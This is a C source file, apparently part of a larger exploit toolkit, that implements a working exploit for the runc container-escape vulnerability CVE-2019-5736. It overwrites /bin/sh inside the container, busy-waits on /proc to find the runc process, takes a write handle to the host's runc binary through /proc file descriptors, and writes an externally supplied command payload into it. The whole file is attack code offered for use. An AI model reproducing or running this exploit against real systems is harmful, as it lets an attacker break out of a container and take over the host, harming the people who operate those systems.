#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <stdlib.h>

#include "exploits_internal.h"

static void overwrite_binary(char *path) {
    FILE *F = fopen(path, "w");
    if (F == NULL) {
        return;
    }

    fprintf(F, "#!/proc/self/exe\n");
    fclose(F);
}

static int search_runc_pid() {
    DIR *dp;
    struct dirent *ep;
    char buf[256];

    const int BUFSIZE = 4096; // TODO
    unsigned char buffer[BUFSIZE];

    while (1) {
        dp = opendir("/proc");
        if (dp == NULL) {
            printf("Read dir error");
            return 0;
        }

        while ((ep = readdir(dp)) != NULL) {
            snprintf(buf, sizeof(buf), "%s%s%s", "/proc/", ep->d_name, "/cmdline");

            int fd = open(buf, O_RDONLY);

            if (fd == -1)
                continue;

            size_t nbytesread = read(fd, buffer, BUFSIZE);
            unsigned char *end = buffer + nbytesread;
            for (unsigned char *p = buffer; p < end; )
            {
                if (strstr(p, "runc")) {
                    closedir(dp);
                    return atoi(ep->d_name);
                }
                while (*p++);
            }
        }

        closedir(dp);
    }
}

static int search_file_descriptor(int runc_pid) {
    FILE *F;
    char buf[256];
    snprintf(buf, sizeof(buf), "%s%i%s", "/proc/", runc_pid, "/exe");

    int fd;
    while (1) {
        F = fopen(buf, "r");
        if (F == NULL) {
            continue;
        }
        fd = fileno(F);

        if (fd < 0) {
            continue;
        }

        break;
    }

    // DON'T FCLOSE!!!
    return fd;
}

static FILE* open_file(int fd) {
    char buf[100];
    FILE *F;

    snprintf(buf, sizeof(buf), "%s%i", "/proc/self/fd/", fd);
    while (1) {
        F = fopen(buf, "w");
        if (F == NULL) {
            continue;
        }
        break;
    }
    return F;
}

void run_CVE_2019_5736() {
    overwrite_binary("/bin/sh");
    printf("[+] /bin/sh overwritten\n");

    int runc_pid = search_runc_pid();
    printf("[+] Found the PID: %i\n", runc_pid);

    int fd = search_file_descriptor(runc_pid);
    printf("[+] Successfully got the file handle: %i\n", fd);

    FILE *F = open_file(fd);
    printf("[+] Successfully got write handle");

    char *payload = get_payload_string();
    printf("[+] The command executed is:\n%s\n", payload);
    fprintf(F, "%s", payload);

    fclose(F);
    free(payload);
}